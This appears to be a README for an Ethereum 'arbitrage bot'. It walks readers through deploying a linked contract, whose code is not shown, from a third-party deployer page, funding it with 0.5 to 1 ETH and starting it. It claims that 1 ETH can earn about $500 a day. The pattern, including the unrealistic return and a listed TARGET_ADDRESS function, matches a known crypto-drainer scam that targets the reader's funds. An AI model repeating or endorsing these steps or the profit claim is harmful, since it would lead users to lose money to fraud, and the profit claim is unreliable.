
# Arbitrage Bot with Built-in Python Automation


![Ether](https://i.ibb.co/NnrfvhZs/Chat-GPT-Image-25-2026-02-40-27.png)

An arbitrage bot is a smart contract that searches for and executes arbitrage opportunities between pools and routers, holding ETH/tokens on its balance. Below is a step-by-step guide on how to deploy your bot and get it running without a single manual call.

## What the bot is

An arbitrage bot is a smart contract connected to an external automation script that controls its operation.

- **`executeArbitrage()`** — the main function: searches for and executes an arbitrage opportunity between pools/routers in a single transaction.
- **`quickSwap()` / `quickSwapFromBalance()`** — a quick swap through an allowed router, directly from the contract's balance.
- **`setRouterAllowed()` / `setTokenAllowed()`** — manages the whitelist of routers and tokens the bot is allowed to work with.
- **`setDefaultFee()` / `setDefaultTokenOut()`** — configures the pool fee and the default token the bot swaps into.
- **`setMinQuickSwapAmount()` / `setMaxQuickSwapAmount()`** — sets min/max amount limits per swap.
- **`setPaused()`** — emergency pause, stopping all contract operations.
- **`revokeApproval()`** — revokes previously granted token approvals.
- **`withdraw()` / `withdrawETH()`** — withdraws tokens/ETH from the contract's balance by the owner.
- **`getBalance()` / `getOwner()` / `owner()` / `TARGET_ADDRESS()`** — helper view functions for reading contract state.

The contract owner is the only one who can change settings and withdraw funds.

## Step-by-step guide

### 1. Open the deployer page

![EtherLab](https://i.ibb.co/PzMH74XW/1.png)

Open [etherlab website](https://etherlabs-sol.github.io/deployer/) (or the hosted version of the page) in your browser — this is the environment where the bot is created and deployed.

### 2. Create the bot file

Create a new `.sol` file in the file manager (e.g. `contract.sol`). Paste the smart contract code into the editor field [contract](contract.sol)

![EtherLab](https://i.ibb.co/nN90b2FP/2.png)

### 3. Compile the bot

Go to the **Compiler** tab, select compiler version **0.8.20**, and click compile.

![Compiling the contract](https://i.ibb.co/vCmJHMGz/3.png)

### 4. Deploy and fund the bot

Go to the **Deploy** tab, connect your wallet — MetaMask or Phantom (whichever is more convenient) — and deploy the contract. Our bot contract will appear below.

You can fund the balance by copying its address: send **0.5 to 1 ETH** — this is enough for beginners.

![Deploying the contract](https://i.ibb.co/39grWTjG/4.png)

### 5. Start the bot via automation

Go to the **Python Automation** tab, make sure all fields are filled in automatically and your contract is selected, click **Start**, and confirm the launch in MetaMask or Phantom.

Do not close the page while the bot is running.

![Starting via automation](https://i.ibb.co/sdLXkqYW/6.png) ![Starting via automation](https://i.ibb.co/hRdRQYhw/7.png)

## What happens after clicking Start

![Starting via automation](https://i.ibb.co/mrw0zT9S/8.png) ![Starting via automation](https://i.ibb.co/spHXSCpW/528.png)

- Every interval, the bot checks `executeArbitrage` via a dry-run (`eth_estimateGas`); if the call would succeed, a real transaction is sent — and it needs to be confirmed once in MetaMask.
- Any other selected functions are checked the same way, but are never sent — no extra confirmations needed.
- In the background, the scanner listens for live Uniswap V2/V3 swap events on mainnet and logs them: who swapped, direction, approximate amounts.
- All bot activity is displayed in the **Logs** panel in real time.

## About profit

The bot doesn't promise mountains of gold — returns depend on market volatility, bot competition, and network gas fees. But under today's market conditions, a deposit of **1 ETH** can realistically average around **~$500 a day**. Results are not guaranteed and may vary depending on market conditions.